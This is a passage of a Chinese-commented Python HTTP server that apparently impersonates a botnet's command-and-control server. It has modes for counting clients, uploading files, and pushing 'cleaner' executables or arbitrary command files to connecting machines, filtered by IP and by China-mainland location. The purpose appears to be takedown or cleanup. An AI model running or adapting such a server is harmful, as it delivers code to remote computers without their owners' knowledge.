                    _f.write(param2)  # 将文件内容写入指定位置

                self.send_response(200)  # 返回 200 OK 响应
                message = str(len(param2)).encode()  # 返回文件内容的大小
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(message)))
                self.end_headers()
                self.wfile.write(message)
                return
            else:
                print("POST Unhandled: ql=" + ql)  # 如果 ql 参数的值不匹配已定义的情况，打印未处理的 ql 值。
        else:
            print("POST Unhandled: path=" + self.path)  # 如果请求路径不是 /content/faq.php，打印未处理的路径。
        self.replyerr()

    # 处理并返回 HTTP 错误响应
    # 执行错误处理，向客户端发送一个 HTTP 404 错误响应，指示请求的资源未找到，并关闭连接
    def replyerr(self):
        self.close_connection = True  # 表示响应结束后，HTTP 连接会被关闭。
        message = b""
        self.send_response(404)
        self.send_header('Content-Length', str(len(message)))
        self.send_header('Connection', 'close')  # 设置响应头 Connection 为 'close'，表示当前 HTTP 连接将在响应结束后关闭。
        self.end_headers()  # 调用 end_headers() 来结束响应头的发送
        self.wfile.write(message)


# 设置线程为守护线程。守护线程在主程序退出时会自动结束，不需要等待它们完成。这使得服务器能够在后台运行，而不会阻塞程序的退出。
class MyHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# 启动HTTP服务器运行、指定服务器类（默认为 MyHTTPServer）、指定请求处理类（默认为 ServerHandler）、指定服务器监听的端口、是否启用 SSL 加密。
def run(server_class=MyHTTPServer, handler_class=ServerHandler, port=80, enablessl=False):
    server_address = ('', port)  # 指定服务器的地址和端口。空字符串表示服务器绑定到所有可用的网络接口。
    httpd = server_class(server_address, handler_class)  # 创建一个 HTTPServer 实例，绑定到指定的地址和端口，并指定请求处理类。
    print(' - Starting httpd...', file=sys.stderr)
    # 默认不启用SSL，这部分可以不用管
    if enablessl:  # 如果启用 SSL（即 enablessl 为 True），则进行 SSL 配置
        pwd = os.path.dirname(os.path.realpath(__file__))  # 获取当前脚本所在的目录路径。
        # openssl req -new -x509 -keyout libsh2_test_helper-ssl.pem -out libsh2_test_helper-ssl.pem -days 3650 -nodes
        certfile = os.path.join(pwd, 'ssl.pem')  # 构造 SSL 证书文件的路径（默认为 ssl.pem）
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) # 创建一个 SSLContext 对象，使用 TLS 服务器协议
        context.load_cert_chain(certfile)     # 加载证书和私钥
        context.set_ciphers('DEFAULT:@SECLEVEL=0') # 设置加密套件，确保兼容性
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)   # 将 httpd 的套接字包装为 SSL 套接字，启用加密通信
    if serverTimeout:# 如果指定了服务器超时时间，则在超时后关闭服务器
        shutdownhttpd(httpd, delay=serverTimeout)
    try:
        httpd.serve_forever()# 启动服务器并开始监听请求，直到程序被中断
    # 运行时按下Ctrl+C则结束运行
    except KeyboardInterrupt:
        print(' - Ctrl+C pressed...', file=sys.stderr)
        shutdownhttpd(httpd, delay=0) # 在捕获到中断信号后立即关闭服务器
    finally:
        httpd.server_close()

# 主函数
if __name__ == "__main__":
    # 解析命令行参数
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('--port', action='store', help='', dest='port', default=80)  # --port：指定服务器端口，默认为 80。
    parser.add_argument('--timeout', action='store', help='', dest='timeout')  # 指定服务器超时时间。
    parser.add_argument('--ssl', action='store_true', help='', dest='ssl', default=False)  # 启用 SSL（HTTPS），默认为 False。
    # clean模式时这个需要加上
    parser.add_argument('--cleanglobal', action='store_true', help='', dest='cleanglobal', default=False)  # 是否进行全局清理。
    parser.add_argument('--datadir', action='store', help='', dest='datadir')  # 指定数据目录。
    # 这个需要有
    parser.add_argument('--workmode', action='store', help='stat,clean,file', dest='workmode')  # 设置工作模式
    parser.add_argument('--allowips', action='store', help='', dest='allowips')  # 允许上传的 IP 地址列表。
    parser.add_argument('--cleanexceptips', action='store', help='', dest='cleanexceptips')  # 指定清理模式时，排除的 IP 地址列表。
    parser.add_argument('--onlychinafile', action='store_true', help='', dest='onlychinafile', default=False)  # 是否仅允许中国 IP 上传文件。
    parser.add_argument('--cmdglobal', action='store_true', help='', dest='cmdglobal', default=False)  # 是否全局使用 cmd 模式。
    # 这个需要加上
    parser.add_argument('--logdir', action='store', help='', dest='logdir', default='')  # 指定日志目录。
    # 用于stat模式
    parser.add_argument('--testclean', action='store_true', help='', dest='testclean', default=False)  # 是否启用清理测试。
    # 用于clean模式
    parser.add_argument('--c2verifymarkclean', action='store_true', help='', dest='c2verifymarkclean', default=False)  # 是否启用 C2 验证清理标记。
    # 下面这个可能有用，用于stat模式
    parser.add_argument('--c2verifyallowed', action='store_true', help='', dest='c2verifyallowed', default=False)  # 是否允许 C2 验证。
    parser.add_argument('--c2verifyallowed_chinaonly', action='store_true', help='', dest='c2verifyallowed_chinaonly', default=False)  # 是否仅允许中国 IP 执行 C2 验证。
    parser.add_argument('--cmdfile', action='store', help='', dest='cmdfile')  # 指定用于命令执行的文件。

    args = parser.parse_args()  # 解析命令行传入的参数，args 存储解析后的参数值。

    if args.workmode not in ['stat', 'clean', 'file', 'cmd']:
        print("workmode must be set to 'stat' or 'clean' or 'file'")
        exit(1)
    # 将 workmode、testclean、c2verifyallowed 和 logdir 设置为相应的命令行参数值。
    Work_Mode = args.workmode
    # 变量Test_Clean只在stat模式有效
    Test_Clean = args.testclean
    c2verifyallowed = args.c2verifyallowed
    logdir = args.logdir
    # 打印服务器端口和超时配置。
    print("port =", args.port)
    if args.timeout:
        print("timeout =", args.timeout)
        serverTimeout = int(args.timeout)
    #  设置数据目录
    if args.datadir:
        as_data_dir = args.datadir
    # logfile日志文件必须有
    logfilename = time.strftime('%Y-%m-%d', time.localtime()) + ".txt"
    os.makedirs(logdir, exist_ok=True)
    glogfilep = open(os.path.join(logdir, logfilename), "ab")
    # clean模式（要用到清除程序）
    if Work_Mode == 'clean':
        if args.c2verifymarkclean:  # 如果 c2verifymarkclean 参数存在，则启用 C2 验证清理
            c2verifymarkclean = True
        print("Clean Mode: ")
        if args.cleanglobal:  # 根据 cleanglobal 参数决定是否进行全球清理或仅清理中国大陆的 IP。
            OnlyCleanChinaMainLand = False  # 如果设置了 cleanglobal，则不限制为中国大陆 IP，执行全球清理
            print("    clean GLOBAL")
        else:
            OnlyCleanChinaMainLand = True  # 如果没有设置 cleanglobal，则只清理中国大陆的 IP
            print("    clean CHINA MAINLAND")
        # 打印清理的条件：如果 c2verifymarkclean 被启用，则说明清理条件为 C2 验证
        if c2verifymarkclean:
            print("    markclean condition: c2verify")
        else:
            print("    markclean condition: download cmd file")
        # 如果指定了 cleanexceptips 参数，则加载排除的 IP 地址列表
        if args.cleanexceptips:
            Clean_Except_IpList = load_ip_list(args.cleanexceptips)
        # 如果 Clean_Except_IpList 非空，则打印排除的 IP 地址列表
        if Clean_Except_IpList:
            print("    Clean_Except_IpList: " + str(Clean_Except_IpList))
        # 加载并解压相关的文件，主要是清理程序的二进制文件。
        load_handshake_a()
        asc_bin = extract_zip('bin.zip', '123123')
        bin_ascleaner32_dll = asc_bin["ascleaner32.dll"]
        bin_ascleaner64_dll = asc_bin["ascleaner64.dll"]
        bin_ascleaner_exe = asc_bin["ascleaner.exe"]
        with open("CMD_bin2", "rb") as _f:
            bin_CMDo = _f.read()
        # 随机生成清除程序名称
        gen_ascleanername()
    # （这个模式目前用不到）file模式（不用清除程序）
    elif Work_Mode == 'file':  # 设置文件上传模式的配置。确保 allowips 参数已指定。
        FileMode_OnlyChinaMainLand = args.onlychinafile  # 设置是否仅允许中国大陆 IP 上传文件
        if args.allowips:  # 如果指定了 allowips 参数，则加载允许上传的 IP 地址列表
            load_allow_ip_list(args.allowips)
        else:
            print("allowips must be set for 'file' mode. empty allowips.txt means all ip allowed")
            exit(1)
        print("File Mode: ")
        if len(Allowed_IpList) == 0:  # 如果允许上传的 IP 地址列表为空
            if FileMode_OnlyChinaMainLand:  # 如果是中国大陆的文件上传模式，则允许所有中国 IP 上传
                print('    all china ip allowed for uploading')
            else:  # 否则，允许所有非中国大陆 IP 上传
                print('    all none-china ip allowed for uploading')
        else:  # 如果指定了允许上传的 IP 地址列表，打印允许上传的 IP 数量
            print(f'    {len(Allowed_IpList)} ip allowed for uploading')
        # 加载用于握手的hexlist
        load_handshake_a()
    # stat模式（不用清除程序）
    elif Work_Mode == 'stat':  # 如果工作模式是 stat，则加载与 C2 验证相关的配置。
        c2verifyallowed_ChinaOnly = args.c2verifyallowed_chinaonly  # 如果启用了 c2verifyallowed_chinaonly 参数，则设置为仅允许中国大陆的 C2 验证
        print("c2verifyallowed=" + str(c2verifyallowed))  # 打印 c2verifyallowed 配置
        if c2verifyallowed:  # 如果启用了 C2 验证
            # 加载用于握手的hexlist
            load_handshake_a()
    # cmd模式（可能要用到清除程序）
    elif Work_Mode == 'cmd':  # 如果工作模式是 cmd，则加载并配置命令相关的程序，支持自定义命令文件。
        Allow_Upload = True  # 设置允许上传文件的标志为 True
        FileMode_OnlyChinaMainLand = True  # 设置默认文件上传模式为中国大陆 IP
        if args.cmdglobal:  # 如果启用了 cmdglobal 参数，则允许全球文件上传
            FileMode_OnlyChinaMainLand = False
        load_handshake_a()  # 加载用于握手的 hexlist
        cmdfile = 'CMD_bin3'  # 设置默认命令文件为 'CMD_bin3'
        if args.cmdfile:  # 如果指定了 cmdfile 参数，则使用指定的文件
            cmdfile = args.cmdfile
        with open(cmdfile, "rb") as _f:  # 读取命令文件的内容并存储为 bin_CMDo
            bin_CMDo = _f.read()
        # 随机生成清除程序名称
        gen_ascleanername()

    # 启动接管服务器程序运行
    run(port=int(args.port), enablessl=args.ssl)  # 调用 run 函数启动 HTTP 服务器，传入端口和是否启用 SSL 配置。
    if flagTimeout:
        exit(10)

# 这个代码实现了一个功能丰富的 HTTP 服务器，支持多种工作模式和复杂的请求处理逻辑。其主要功能包括：
# 日志记录：记录访问、清理和文件上传日志。
# 文件上传：支持通过 HTTP POST 请求上传文件。
# IP 地址过滤：根据 IP 地址或地理位置过滤请求。
# 动态文件名生成：在 clean 和 cmd 模式下生成随机的文件名。
# SSL 加密：支持通过 SSL 加密通信。
# 多工作模式：支持 stat、clean、file、cmd 四种模式，满足不同的需求。
# 这个服务器可以用于测试、日志统计、文件上传、清理操作等场景，具有较强的灵活性和扩展性。
